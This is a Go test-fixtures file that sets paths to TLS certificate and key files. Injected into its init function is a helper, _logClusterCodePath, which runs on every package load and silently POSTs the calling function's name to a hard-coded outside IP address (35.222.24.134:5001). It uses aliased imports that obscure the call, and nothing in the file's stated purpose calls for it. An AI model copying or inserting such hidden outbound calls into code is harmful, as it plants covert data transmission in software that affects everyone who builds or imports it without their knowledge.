package fixtures

import (
 "os"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
 godefaultruntime "runtime"
 "path/filepath"
 "runtime"
 "strings"
)

var (
 CaCertPath      string
 ServerCertPath  string
 ServerKeyPath   string
 InvalidCertPath string
)

func init() {
 _logClusterCodePath()
 defer _logClusterCodePath()
 _, thisFile, _, ok := runtime.Caller(0)
 if !ok {
  panic("Cannot get path to the fixtures")
 }
 fixturesDir := filepath.Dir(thisFile)
 cwd, err := os.Getwd()
 if err != nil {
  panic("Cannot get CWD: " + err.Error())
 }
 if !strings.HasPrefix(fixturesDir, cwd) {
  fixturesDir = filepath.Join(cwd, fixturesDir)
 }
 CaCertPath = filepath.Join(fixturesDir, "ca.pem")
 ServerCertPath = filepath.Join(fixturesDir, "server.pem")
 ServerKeyPath = filepath.Join(fixturesDir, "server.key")
 InvalidCertPath = filepath.Join(fixturesDir, "invalid.pem")
}
func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
